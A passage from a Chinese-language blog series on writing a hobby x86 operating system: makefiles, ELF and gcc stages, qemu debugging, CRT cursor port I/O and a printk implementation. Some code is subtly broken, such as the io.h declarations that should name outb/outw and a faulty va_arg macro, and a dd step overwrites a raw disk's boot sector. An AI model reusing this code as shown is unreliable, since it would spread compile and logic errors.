$(BUILD)/kernel/start.o $(shell mkdir -p $(dir $@)) ld -m elf_i386 -static $^ -o $@ -Ttext $(ENTRYPOINT)$(BUILD)/system.bin: $(BUILD)/kernel.bin objcopy -O binary $&lt; $@$(BUILD)/system.map: $(BUILD)/kernel.bin nm $&lt; | sort &gt; $@$(BUILD)/master.img: $(BUILD)/boot/boot.bin \\ $(BUILD)/boot/loader.bin \\ $(BUILD)/system.bin \\ $(BUILD)/system.map \\ yes | bximage -hd -mode=&quot;flat&quot; -size=60 -q $(BUILD)/master.img dd if=$(BUILD)/boot/boot.bin of=$@ bs=512 count=1 conv=notrunc dd if=$(BUILD)/boot/loader.bin of=$@ bs=512 count=4 seek=2 conv=notrunc dd if=$(BUILD)/system.bin of=$@ bs=512 count=200 seek=10 conv=notrunc.PHONY: cleanclean: rm -rf $(BUILD)/*.PHONY: usbusb: $(BUILD)/boot/boot.bin /dev/sdb sudo dd if=/dev/sdb of=tmp.bin bs=512 count=1 conv=notrunc cp tmp.bin usb.bin sudo rm tmp.bin dd if=$(BUILD)/boot/boot.bin of=usb.bin bs=446 count=1 conv=notrunc sudo dd if=usb.bin of=/dev/sdb bs=512 count=1 conv=notrunc rm usb.bintest: $(BUILD)/master.img.PHONY: bochsbochs: $(BUILD)/master.img bochs -q 在bochsrc配置里面注意更改硬盘的path配置为 …/build/master.img 测试 src/kernel/start.asm 12345[bits 32]global _start_start: mov byte [0xb8000], &#x27;k&#x27;; 表示进入了内核 src/boot/loader.asm 在protect_mode里面添加，调整栈帧后，使用代码选择子跳转到0x10000内存执行start.asm 1234567mov esp, 0x10000; 栈顶mov edi, 0x10000 ; 读到的目标内存mov ecx, 10 ; 起始扇区mov bl,200 ;扇区数量call read_disk; xchg bx, bxjmp dword code_selector:0x10000 在目标内存地址(0x10000)找到kernel.bin的二进制代码 操作系统实现-ELF文件格式 这个对CTFpwner来说比较简单 ELF的三种格式 可重定位文件（Relocatable file） 包含了代码和数据，可以和其他目标文件链接生成一个可执行文件或共享 目标文件。 可执行文件（Executable File） 包含了可以直接执行的文件。 共享目标文件（Shared Object File） 包含了用于链接的代码和数据，分两种情况。一种是链接器将其与其他的 可重定位文件和共享目标文件链接起来，生产新的目标文件。另一种是动 态链接器将多个共享目标文件与可执行文件结合，作为进程映像的一部 分 内核的文件格式：可执行程序 代码段 .text section(ELF文件段)| segment CPU 数据 .data section：已经初始化过后的数据 .bss(Block Started by Symbol)：未初始化过的数据 程序分析 12345#include &lt;stdio.h&gt; int main()&#123; printf(&quot;hello world\\n&quot;); return 0;&#125; 编译 1gcc -m32 hello.c -o hello 使用readelf objdump IDA_PRO等查看 1readelf -e hello 相关资料 CTF-WIKI ELF 文件 操作系统实现-编译链接与数据类型 编译链接 当GCC编译程序的时候会经历上述几步： 我们在项目 新建src/kernel/include/xsys 在里面新建include/xsys/xsys.h 12345678#ifndef XSYS_H#define XSYS_H#define XSYS_MAGIC 20220227void kernel_init(); //初始化内核#endif 创建src/kernel/main.c 123456789101112131415#include &lt;xsys/xsys.h&gt;int magic = XSYS_MAGIC; char message[]=&quot;hello Xsys&quot;; //.datachar buf[1024]; //.bssvoid kernel_init()&#123; char *video = (char *) 0xb8000; //文本显示器内存位置 for (int i = 0; i &lt; sizeof(message); i++) &#123; video[i*2]=message[i]; &#125;&#125; 预处理 1gcc -m32 -E main.c -I ../include/ &gt; test.c 这样就生成了main.c的与处理文件 12345678910111213141516171819202122232425# 1 &quot;main.c&quot;# 1 &quot;&lt;built-in&gt;&quot;# 1 &quot;&lt;command-line&gt;&quot;# 31 &quot;&lt;command-line&gt;&quot;# 1 &quot;/usr/include/stdc-predef.h&quot; 1 3 4# 32 &quot;&lt;command-line&gt;&quot; 2# 1 &quot;main.c&quot;# 1 &quot;../include/xsys/xsys.h&quot; 1void kernel_init();# 2 &quot;main.c&quot; 2int magic = 20220227;char message[]=&quot;hello Xsys&quot;;char buf[1024];void kernel_init()&#123; char *video = (char *) 0xb8000; for (int i = 0; i &lt; sizeof(message); i++) &#123; video[i*2]=message[i]; &#125;&#125; 汇编 1gcc -m32 -S test.c &gt; test.s 得到C转汇编的源代码文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475 .file &quot;test.c&quot; .text .globl magic .data .align 4 .type magic, @object .size magic, 4magic: .long 20220227 .globl message .align 4 .type message, @object .size message, 11message: .string &quot;hello Xsys&quot; .comm buf,1024,32 .text .globl kernel_init .type kernel_init, @functionkernel_init:.LFB0: .cfi_startproc pushl %ebp .cfi_def_cfa_offset 8 .cfi_offset 5, -8 movl %esp, %ebp .cfi_def_cfa_register 5 pushl %ebx subl $16, %esp .cfi_offset 3, -12 call __x86.get_pc_thunk.ax addl $_GLOBAL_OFFSET_TABLE_, %eax movl $753664, -8(%ebp) movl $0, -12(%ebp) jmp .L2.L3: movl -12(%ebp), %edx addl %edx, %edx movl %edx, %ecx movl -8(%ebp), %edx addl %edx, %ecx leal message@GOTOFF(%eax), %ebx movl -12(%ebp), %edx addl %ebx, %edx movzbl (%edx), %edx movb %dl, (%ecx) addl $1, -12(%ebp).L2: movl -12(%ebp), %edx cmpl $10, %edx jbe .L3 nop addl $16, %esp popl %ebx .cfi_restore 3 popl %ebp .cfi_restore 5 .cfi_def_cfa 4, 4 ret .cfi_endproc.LFE0: .size kernel_init, .-kernel_init .section .text.__x86.get_pc_thunk.ax,&quot;axG&quot;,@progbits,__x86.get_pc_thunk.ax,comdat .globl __x86.get_pc_thunk.ax .hidden __x86.get_pc_thunk.ax .type __x86.get_pc_thunk.ax, @function__x86.get_pc_thunk.ax:.LFB1: .cfi_startproc movl (%esp), %eax ret .cfi_endproc.LFE1: .ident &quot;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0&quot; .section .note.GNU-stack,&quot;&quot;,@progbits 编译 1as -32 test.s -o test.o 将test.s编译位32位的ELF文件test.o 这个时候使用readelf查看文件结构 1readelf -a test.o 会看到这些段都是没有地址的，当我们链接才能找到准确的地址 同时我们的变量也加入到了符号表中 链接 1ld -m elf_i386 -static test.o -o test.out -e kernel_init 将test.o文件按照elf i386的格式链接到库文件，同时声明外部函数kernel_init 这个时候已经有了Addr了，但是启动还是会出错，因为我们之前定义的是在0x10000出启动程序 gcc直接编译 1gcc -m32 main.c -I ../include/ -o main.out -e kernel_init -nostartfiles -nostartfiles：类似与windows里面的入口点不使用main 写入到操作系统 添加一个kernel/%.c编译到kernel/%.o的makefile 123$(BUILD)/kernel/%.o: $(SRC)/kernel/%.c $(shell mkdir -p $(dir $@)) gcc $(CFLAGS) $(DEBUG) $(INCLUDE) -c $&lt; -o $@ 同时可以加还是那个编译参数 123DEBUG:= -gCFLAGS:= -m32INCLUDE:= -I$(SRC)/include 完整的makefile如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455BUILD:=../buildSRC:=.ENTRYPOINT:=0x10000CFLAGS:= -m32DEBUG:= -gINCLUDE:= -I$(SRC)/include$(BUILD)/boot/%.bin: $(SRC)/boot/%.asm $(shell mkdir -p $(dir $@)) nasm -f bin $&lt; -o $@$(BUILD)/kernel/%.o: $(SRC)/kernel/%.asm $(shell mkdir -p $(dir $@)) nasm -f elf32 $(DEBUG) $&lt; -o $@$(BUILD)/kernel/%.o: $(SRC)/kernel/%.c $(shell mkdir -p $(dir $@)) gcc $(CFLAGS) $(DEBUG) $(INCLUDE) -c $&lt; -o $@ $(BUILD)/kernel.bin: $(BUILD)/kernel/start.o \\ $(BUILD)/kernel/main.o $(shell mkdir -p $(dir $@)) ld -m elf_i386 -static $^ -o $@ -Ttext $(ENTRYPOINT)#objcpoy加载bss段展开文件$(BUILD)/system.bin: $(BUILD)/kernel.bin objcopy -O binary $&lt; $@$(BUILD)/system.map: $(BUILD)/kernel.bin nm $&lt; | sort &gt; $@$(BUILD)/master.img: $(BUILD)/boot/boot.bin \\ $(BUILD)/boot/loader.bin \\ $(BUILD)/system.bin \\ $(BUILD)/system.map \\ yes | bximage -hd -mode=&quot;flat&quot; -size=60 -q $(BUILD)/master.img dd if=$(BUILD)/boot/boot.bin of=$@ bs=512 count=1 conv=notrunc dd if=$(BUILD)/boot/loader.bin of=$@ bs=512 count=4 seek=2 conv=notrunc dd if=$(BUILD)/system.bin of=$@ bs=512 count=200 seek=10 conv=notrunc.PHONY: cleanclean: rm -rf $(BUILD)/*test: $(BUILD)/master.img.PHONY: bochsbochs: $(BUILD)/master.img bochs -q 再修改下kernel/start.asm 123456789101112[bits 32]extern kernel_initglobal _start_start: ; mov byte [0xb8000], &#x27;k&#x27;; 表示进入了内核 xchg bx, bx call kernel_init xchg bx, bx jmp $ make test一下没问题后make clean再make bochs调试 进入kernel_init 显示输出被覆盖，说明调用成功 数据类型 在操作系统中，数据类型都是被定义好的 新建include/xsys/types.h 1234567891011121314151617181920212223242526#ifndef XSYS_TYPES_H#define XSYS_TYPES_H#define EOF -1 //end of file#define NULL 0 //空指针#define bool _Bool#define true 1#define false 0//#define _packed __attribute__((packed))typedef unsigned int size_t;typedef char int8;typedef short int16;typedef int int32;typedef long int64;typedef unsigned char u8;typedef unsigned short u16;typedef unsigned int u32;typedef unsigned long u64;#endif 新建test/test.c 1234567891011121314151617181920212223242526272829303132#include &lt;xsys/types.h&gt;#include &lt;stdio.h&gt;typedef struct descriptor&#123; unsigned short limit_low; unsigned int base_low : 24; unsigned char type : 4; unsigned char segment : 1; unsigned char DPL : 2; unsigned char present : 1; unsigned char limit_high :4; unsigned char avaliable : 1; unsigned char long_mode : 1; unsigned char big : 1; unsigned char granulartity : 1; unsigned char base_high;&#125; __attribute__((packed)) descriptor;// &#125;descriptor;int main()&#123; printf(&quot;size of u8 %d\\n&quot;, sizeof(u8)); printf(&quot;size of u16 %d\\n&quot;, sizeof(u16)); printf(&quot;size of u32 %d\\n&quot;, sizeof(u32)); printf(&quot;size of u64 %d\\n&quot;, sizeof(u64)); printf(&quot;size of descriptor %d\\n&quot;, sizeof(descriptor)); descriptor des; return 0;&#125; __attribute__用于不对齐变量来构造特殊结构体，使用vscode自带的调试可以看出 操作系统实现-qemu调试与vmdk qemu调试 其实你也可以用bochs-gdb，但是我觉得bochs-gdb要重新配置一些文件很麻烦，还是vm+vscode调试方便些，所以这里需要用到qemu 安装qemu 12sudo apt-get install qemusudo apt-get install qemu-extract 在qemu中启动系统 src/makefile中，添加 123456.PHONY: qemuqemu: $(BUILD)/master.img qemu-system-i386 \\ -m 32M \\ -boot c \\ -hda $&lt; 使用i386构架的CPU，内存位32MB，存储是硬盘(boot -c)，选择的硬盘文件是$(BUILD)/master.img 使用qemu调试 src/makefile中，添加 1234567.PHONY: qemugqemug: $(BUILD)/master.img qemu-system-i386 \\ -s -S \\ -m 32M \\ -boot c \\ -hda $&lt; 这里-s -S是调试，远程调试，远程调试端口是1234 为了测试，使用vscode在src/kernel/main.c中下个断点 在vm中启用qemu调试，qemu等待debugger启动调试 之后可以在vscode中直接使用F5调试，但是launch.json中的program要改为**${workspaceFolder}/build/kernel.bin** F5开始调试 接着继续 vmdk 使用qemu的一些功能可以把我们的master.img转换成master.vmdk从而在vmware上运行 在src/makefile中新增 12345$(BUILD)/master.vmdk: $(BUILD)/master.img qemu-img convert -O vmdk $&lt; $@.PHONY: vmdkvmdk: $(BUILD)/master.vmdk 得到vmdk文件过后直接创建虚拟机就行了 在创建虚拟机是要注意： Linux版本最好&gt;=4，不然\\xaa\\x55校验过不了 虚拟磁盘类型选择IDE 使用现有虚拟磁盘，选择刚才生成的vmdk文件就行 操作系统实现-gcc与汇编 在之前的test文件中新建一个hello.c和src/test/makefile hello.c 12345678910#include &lt;stdio.h&gt;char message[] = &quot;hello world\\n&quot;;char buf[1024];int main()&#123; printf(&quot;%s\\n&quot;,message); return 0;&#125; makefile 12345678910111213CFLAGS:= -m32# CFLAGS+= -fno-builtin #不需要gcc内置函数# CFLAGS+= -nostdinc #不用标准头文件# CFLAGS+= -nostdlib #不需要标准库# CFLAGS+= -fno-pic #不需要位置无关代码# CFLAGS+= -fno-pie #关闭PIE保护# CFLAGS+= -fno-stack-protector #不需要栈保护CFLAGS:=$(strip $&#123;CFLAGS&#125;).PHONY: hello.shello.s: hello.c gcc $(CFLAGS) -S $&lt; -o $@ 在生成了.s汇编文件中，会发现有**.cfi**开始投的段 .cfi：Call Frame Information（调用栈帧信息） 一种DWARF信息，用于调试，获得调用异常 -fno-asynchronous-unwind-tables，不需要cfi信息 call __x86.get_pc_thunk.ax：生成PIC的辅助函数，获取调用时EIP的值，功能上相当于mov eax, eip，接着得到 _GLOBAL_OFFSET_TABLE_ PIC：postion independent code（位置无关代码） -fno-pic，不需要位置无关代码 ** _GLOBAL_OFFSET_TABLE_ **：里面存储了符号地址信息 .ident &quot;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0： .ident：GCC的版本信息 -Qn：去掉GCC版本信息 andl $-16, %esp：栈对齐 −16=0−16=0−10H=fffffff0H-16 = 0 - 16 = 0-10H = fffffff0H−16=0−16=0−10H=fffffff0H 与操作过后就有只剩最后四位，这样就将栈16字节对齐 字节对齐访问内存更加高效（使用更少的时钟周期） 数据访问的过程： 待读数据的内存地址放入地址总线 修改READ标志启用断言，及没有正确就会出发halt暂停 等待内存控制器响应 把数据从数据总线复制到目标地址 由上：若不对齐访问的话，会多传几次地址才能得到需要的值，从而造成更多的时钟周期浪费 -mpreferred-stack-boundary=2：取消栈对齐 栈帧 123456pushl %ebpmovl %esp, %ebp...leave ;等效于 ;mov %ebp, %esp ;pop %ebp -fomit-frame-pointer：去掉栈帧 最后剩下的 123456789101112131415161718192021 .file &quot;hello.c&quot; ;文件名 .text ;代码段 .globl message ;将message导出 .data ;数据段 .align 4 ;按4字节对齐 .type message, @object;类型 .size message, 13 ;尺寸message: .string &quot;hello world\\n&quot; .comm buf,1024,32 .text ;代码段 .globl main ;main函数 .type main, @functionmain: pushl $message ;&amp;message压入栈中 call puts addl $4, %esp ;恢复栈 movl $0, %eax ;函数返回值，存储在eax中 ret ;函数调用返回 .size main, .-main ;main函数尺寸 .section .note.GNU-stack,&quot;&quot;,@progbits ;标及栈不可运行，NX保护 vscode中调试汇编 在设置里面搜索break，打开允许所有文件断点 在task.json中 “type”: “shell” ![](https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/dbc59407db30d4cf22704e34ea41cfc3.png 操作系统实现-堆栈/函数/变量/传参 堆栈和函数 其实之前CTF里面的文章讲过一些了 https://blog.joe1sn.top/2021/01/16/heap_learning_part0-堆基础/ 栈：是一个很重要的数据结构，特征：后进先出 堆栈是一块内存区域 栈顶指针是在ss:esp寄存器中，栈底在高地址，向下增长 创建src/test/call.asm 12345678[bits 32]extern exitglobal mainmain: push 0 ;传递参数 call exit 在src/.vscode/launch.json添加调试参数使用NASM汇编格式 123456789101112131415161718192021222324252627&#123; &quot;name&quot;: &quot;NASM Build Debugger&quot;, &quot;type&quot;: &quot;cppdbg&quot;, &quot;request&quot;: &quot;launch&quot;, // &quot;program&quot;: &quot;$&#123;workspaceFolder&#125;/build/kernel.bin&quot;, &quot;program&quot;: &quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.out&quot;, &quot;args&quot;: [], &quot;stopAtEntry&quot;: false, &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot;, &quot;environment&quot;: [], &quot;externalConsole&quot;: false, &quot;MIMode&quot;: &quot;gdb&quot;, &quot;setupCommands&quot;: [ &#123; &quot;description&quot;: &quot;为 gdb 启用整齐打印&quot;, &quot;text&quot;: &quot;-enable-pretty-printing&quot;, &quot;ignoreFailures&quot;: true &#125;, &#123; &quot;description&quot;: &quot;将反汇编风格设置为 Intel&quot;, &quot;text&quot;: &quot;-gdb-set disassembly-flavor intel&quot;, &quot;ignoreFailures&quot;: true &#125; ], &quot;preLaunchTask&quot;: &quot;NASM Build Debugger&quot;, &quot;miDebuggerPath&quot;: &quot;/usr/bin/gdb&quot;&#125; 修改./.vscode/task.json添加如下配置 1234567891011121314151617181920212223242526272829303132333435&#123; &quot;type&quot;: &quot;shell&quot;, &quot;label&quot;: &quot;NASM Build Debugger&quot;, &quot;command&quot;: &quot;&quot;, &quot;args&quot;: [ &quot;/usr/bin/nasm&quot;, &quot;-f&quot;, &quot;elf32&quot;, &quot;-g&quot;, &quot;$&#123;file&#125;&quot;, &quot;-o&quot;, &quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.o&quot;, &quot;;&quot;, &quot;/usr/bin/gcc&quot;, &quot;-fdiagnostics-color=always&quot;, &quot;-m32&quot;, //32 位程序 &quot;-g&quot;, &quot;-static&quot;, &quot;-I$&#123;workspaceFolder&#125;/src/include&quot;, &quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.o&quot;, &quot;-o&quot;, &quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.out&quot; ], &quot;options&quot;: &#123; &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot; &#125;, &quot;problemMatcher&quot;: [ &quot;$gcc&quot; ], &quot;group&quot;: &#123; &quot;kind&quot;: &quot;build&quot;, &quot;isDefault&quot;: true &#125;, &quot;detail&quot;: &quot;调试器生成的任务。&quot; &#125; 32位汇编到object再用gcc到elf.out，调试表丢失 我用同样的方法试了一个32位的helloworld，也是无法调试，objdump看有file line addr信息，gdb也是which has no line number infomation，然后vscode调试的时候多下几个断点才能起到效果.很烦人 所以这里我直接猛下断点 经过编译与链接，最终的elf文件如下 在调试控制台使用如下命令查看栈信息 1-exec display/8xw $sp （图片被处理过）可以看到栈的生长方向，还有相关的一些值 push：入栈 pop：出栈 pusha：压入8个寄存器 popa：弹出7个寄存器，忽略esp 函数 call：函数返回的下一条指令的返回地址压入栈 ret：栈顶弹出到EIP call与ret无关 变量与传参 新建src/test/param.c 12345678910111213int add(int x,int y)&#123; int z = x + y; return z;&#125;int main()&#123; int a = 5; int b = 3; int c = add(a,b); return 0;&#125; 写makefile 123.PHONY: param.sparam.s: param.c gcc $(CFLAGS) -S $&lt; -o $@ 最后生成的src/test/param.asm 123456789101112131415161718192021222324252627282930313233343536373839 .file &quot;param.c&quot; .text .globl add .type add, @functionadd: pushl %ebp movl %esp, %ebp subl $4, %esp ;一个局部变量 movl 8(%ebp), %edx ;a movl 12(%ebp), %eax ;b addl %edx, %eax ;相加，eax+=edx movl %eax, -4(%ebp) ;z = x + y movl -4(%ebp), %eax ;eax = z leave ret .size add, .-add .globl main .type main, @functionmain: pushl %ebp movl %esp, %ebp ;保存栈帧 subl $12, %esp ;保存12字节，及3个局部变量 movl $5, -12(%ebp);a movl $3, -8(%ebp);b ;-----------------------------32位传参准备 pushl -8(%ebp) ;b pushl -12(%ebp) ;a call add addl $8, %esp ;esp恢复 movl %eax, -4(%ebp);c=add(a,b) movl $0, %eax ;返回值存储在eax中(return 0) leave ;回复栈帧 ret .size main, .-main .section .note.GNU-stack,&quot;&quot;,@progbits 64位：寄存器传参 32位：栈传参 取消栈帧 123456789101112131415161718192021222324252627282930 .file &quot;param.c&quot; .text .globl add .type add, @functionadd: subl $4, %esp movl 8(%esp), %edx movl 12(%esp), %eax addl %edx, %eax movl %eax, (%esp) movl (%esp), %eax addl $4, %esp ret .size add, .-add .globl main .type main, @functionmain: subl $12, %esp movl $5, (%esp) movl $3, 4(%esp) pushl 4(%esp) pushl 4(%esp) call add addl $8, %esp movl %eax, 8(%esp) movl $0, %eax addl $12, %esp ret .size main, .-main .section .note.GNU-stack,&quot;&quot;,@progbits 堆：https://blog.joe1sn.top/2021/01/16/heap_learning_part0-堆基础/ 操作系统实现-IO与字符串处理 代码来源：https://github.com/StevenBaby/onix 相关课程：https://www.bilibili.com/video/BV1gR4y1u7or 感谢B站UP：踌躇月光 带来的相关代码和教程 Input/Output 参考之前的硬盘读写，那么我们需要对一些端口进行操作 CRT：阴极射线管 地址寄存器：0x3D4 数据寄存器：0x3D5 光标位置：高位0xE 光标位置：高位0xF src/include/xsys/io.h 123456789101112#ifndef XSYS_IO_H#define XSYS_IO_H#include &lt;xsys/types.h&gt;extern u8 inb(u16 port); //输入一个字节extern u16 inw(u16 port); //输入一个字extern void inb(u16 port, u8 value); //输出一个字节extern void inw(u16 port, u16 value); //输出一个字#endif src/kernel/io.asm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566[bits 32]section .text; 代码段global inb ; 将 inb 导出inb: push ebp; mov ebp, esp ; 保存帧 xor eax, eax ; 将 eax 清空 mov edx, [ebp + 8]; port in al, dx; 将端口号 dx 的 8 bit 输入到 al jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 leave ; 恢复栈帧 retglobal outboutb: push ebp; mov ebp, esp ; 保存帧 mov edx, [ebp + 8]; port mov eax, [ebp + 12]; value out dx, al; 将 al 中的 8 bit 输入出到 端口号 dx jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 leave ; 恢复栈帧 retglobal inwinw: push ebp; mov ebp, esp ; 保存帧 xor eax, eax ; 将 eax 清空 mov edx, [ebp + 8]; port in ax, dx; 将端口号 dx 的 16 bit 输入到 ax jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 leave ; 恢复栈帧 retglobal outwoutw: push ebp ; mov ebp, esp ; 保存帧 mov edx, [ebp + 8]; port mov eax, [ebp + 12]; value out dx, ax; 将 ax 中的 16 bit 输入出到 端口号 dx jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 leave ; 恢复栈帧 ret src/kernel/main.c 1234567891011121314151617181920212223242526#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#define CRT_ADDR_REG 0x3d4#define CRT_DATA_REG 0x3d5#define CRT_CURSOR_H 0xeu#define CRT_CURSOR_L 0xfvoid kernel_init()&#123; //获得当前光标坐标 outb(CRT_ADDR_REG,CRT_CURSOR_H); //将高位导出到地址端口 u16 pos = inb(CRT_DATA_REG) &lt;&lt; 8; //移到pos高位 outb(CRT_ADDR_REG,CRT_CURSOR_L); //将低位导出到地址端口 pos |= inb(CRT_DATA_REG); //移到pos低位 //修改当前光标坐标 outb(CRT_ADDR_REG,CRT_CURSOR_H); outb(CRT_DATA_REG,0); outb(CRT_ADDR_REG,CRT_CURSOR_L); outb(CRT_DATA_REG,1); return;&#125; src/makefile 添加io.o依赖 1234567$(BUILD)/kernel.bin: \\ $(BUILD)/kernel/start.o \\ $(BUILD)/kernel/main.o \\ $(BUILD)/kernel/io.o $(shell mkdir -p $(dir $@)) ld -g -m elf_i386 -static $^ -o $@ -Ttext $(ENTRYPOINT) 关于调试 我在网上找了一圈，实在是没有找到像视频中的效果，所以建议使用gdb调试汇编相关 首先调试获得光标，这里基本要观察的变量在C语言中，可以试着使用vscode远程调试 ​ 最后的得到值是：240，bin(240)=11110000bin(240)=11110000bin(240)=11110000，所以高位是1111，地位是0000 240=3∗80240=3*80240=3∗80，刚好也是第四行第一个 接着修改光标位置 其实我们可以算出坐标的值：000000001，我们可以验证下 字符串处理 有 #include &lt;string.h&gt; 同时可以使用汇编或等更高效的实现 参考 https://www.bilibili.com/video/BV1zL4y1s76t/?spm_id_from=333.788 https://www.osdever.net/FreeVGA/home.htm http://www.osdever.net/FreeVGA/vga/crtcreg.htm 操作系统实现-多参数与printk实现 printf的多参数原理 printk这个函数实在操作系统内核里面实现的，一般在用户态中是printf，两者原理上差不多 首先看printf的多参数实现 在Linux源代码中，printf是这样写的 /arch/x86/boot/printf.c 1234567891011121314int printf(const char *fmt, ...)&#123; char printf_buf[1024]; va_list args; int printed; va_start(args, fmt); printed = vsprintf(printf_buf, fmt, args); va_end(args); puts(printf_buf); return printed;&#125; 其中的变量类型 va_list、va_start、va_end定义如下 /include/linux/stdarg.h 1234567891011#ifndef _LINUX_STDARG_H#define _LINUX_STDARG_Htypedef __builtin_va_list va_list;#define va_start(v, l) __builtin_va_start(v, l)#define va_end(v) __builtin_va_end(v)#define va_arg(v, T) __builtin_va_arg(v, T)#define va_copy(d, s) __builtin_va_copy(d, s)#endif gcc/x86_64-linux-gnu/7/include/stdarg.h中，有 1234#ifndef __GNUC_VA_LIST#define __GNUC_VA_LISTtypedef __builtin_va_list __gnuc_va_list;#endif 通过查阅gcc的源代码你会发现最原始的功能实现被改进了很多，其实可以翻译为 12345678910#ifndef XSYS_STDARG_H#define XSYS_STDARG_Htypedef char* va_list;#define va_start(ap, v) (ap = (va_list)&amp;v + sizeof(char*) )#define va_arg(ap, t) (* (t*)(ap+=sizeof(char*)-sizeof(char*)) )#define va_end(ap) (ap = (va_list)0)#endif va_start(ap, v)：ap为 v（一个va_list）的开始格式化字符串 va_arg(ap, t)：t为当前格式化字符串，ap为下一个格式化字符串 注：ap+=sizeof(char*)-sizeof(char*)这时已经ap=ap+sizeof(char *)了 va_end(ap)：让格式化字符串置零 则我们可以有printk实现 printk实现 src/kernel/printk.c 12345678910111213141516171819#include &lt;xsys/stdarg.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/console.h&gt;static char buf[1024];int printk(const char *fmt, ...)&#123; va_list args; int i; va_start(args, fmt); i = vsprintf(buf, fmt, args); va_end(args); console_write(buf, i); return i;&#125; src/lib/vsprintf.c 这里可以取巧抄linux的源代码：https://elixir.bootlin.com/linux/latest/source/arch/x86/boot/printf.c#L113 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381#include &lt;xsys/stdarg.h&gt;#include &lt;xsys/string.h&gt;#define ZEROPAD 1 // 填充零#define SIGN 2 // unsigned/signed long#define PLUS 4 // 显示加#define SPACE 8 // 如是加，则置空格#define LEFT 16 // 左调整#define SPECIAL 32 // 0x#define SMALL 64 // 使用小写字母#define is_digit(c) ((c) &gt;= &#x27;0&#x27; &amp;&amp; (c) &lt;= &#x27;9&#x27;)// 将字符数字串转换成整数，并将指针前移static int skip_atoi(const char **s)&#123; int i = 0; while (is_digit(**s)) i = i * 10 + *((*s)++) - &#x27;0&#x27;; return i;&#125;// 将整数转换为指定进制的字符串// str - 输出字符串指针// num - 整数// base - 进制基数// size - 字符串长度// precision - 数字长度(精度)// flags - 选项static char *number(char *str, unsigned long num, int base, int size, int precision, int flags)&#123; char c, sign, tmp[36]; const char *digits = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; int i; int index; char *ptr = str; // 如果 flags 指出用小写字母，则定义小写字母集 if (flags &amp; SMALL) digits = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;; // 如果 flags 指出要左对齐，则屏蔽类型中的填零标志 if (flags &amp; LEFT) flags &amp;= ~ZEROPAD; // 如果进制基数小于 2 或大于 36，则退出处理 // 也即本程序只能处理基数在 2-32 之间的数 if (base &lt; 2 || base &gt; 36) return 0; // 如果 flags 指出要填零，则置字符变量 c=&#x27;0&#x27;，否则 c 等于空格字符 c = (flags &amp; ZEROPAD) ? &#x27;0&#x27; : &#x27; &#x27;; // 如果 flags 指出是带符号数并且数值 num 小于 0，则置符号变量 sign=负号，并使 num 取绝对值 if (flags &amp; SIGN &amp;&amp; num &lt; 0) &#123; sign = &#x27;-&#x27;; num = -num; &#125; else // 否则如果 flags 指出是加号，则置 sign=加号，否则若类型带空格标志则 sign=空格，否则置 0 sign = (flags &amp; PLUS) ? &#x27;+&#x27; : ((flags &amp; SPACE) ? &#x27; &#x27; : 0); // 若带符号，则宽度值减 1 if (sign) size--; // 若 flags 指出是特殊转换，则对于十六进制宽度再减少 2 位(用于0x) if (flags &amp; SPECIAL) &#123; if (base == 16) size -= 2; // 对于八进制宽度减 1（用于八进制转换结果前放一个零） else if (base == 8) size--; &#125; i = 0; // 如果数值 num 为 0，则临时字符串=&#x27;0&#x27;；否则根据给定的基数将数值 num 转换成字符形式 if (num == 0) tmp[i++] = &#x27;0&#x27;; else while (num != 0) &#123; index = num % base; num /= base; tmp[i++] = digits[index]; &#125; // 若数值字符个数大于精度值，则精度值扩展为数字个数值 if (i &gt; precision) precision = i; // 宽度值 size 减去用于存放数值字符的个数 size -= precision; // 从这里真正开始形成所需要的转换结果，并暂时放在字符串 str 中 // 若 flags 中没有填零(ZEROPAD) 和左对齐（左调整）标志 // 则在 str 中首先填放剩余宽度值指出的空格数 if (!(flags &amp; (ZEROPAD + LEFT))) while (size-- &gt; 0) *str++ = &#x27; &#x27;; // 若需带符号位，则存入符号 if (sign) *str++ = sign; // 若 flags 指出是特殊转换 if (flags &amp; SPECIAL) &#123; // 则对于八进制转换结果头一位放置一个&#x27;0&#x27; if (base == 8) *str++ = &#x27;0&#x27;; // 对于十六进制则存放&#x27;0x&#x27; else if (base == 16) &#123; *str++ = &#x27;0&#x27;; *str++ = digits[33]; &#125; &#125; // 若 flags 中没有左调整（左对齐）标志, 则在剩余宽度中存放 c 字符（&#x27;0&#x27;或空格） if (!(flags &amp; LEFT)) while (size-- &gt; 0) *str++ = c; // 此时 i 存有数值 num 的数字个数 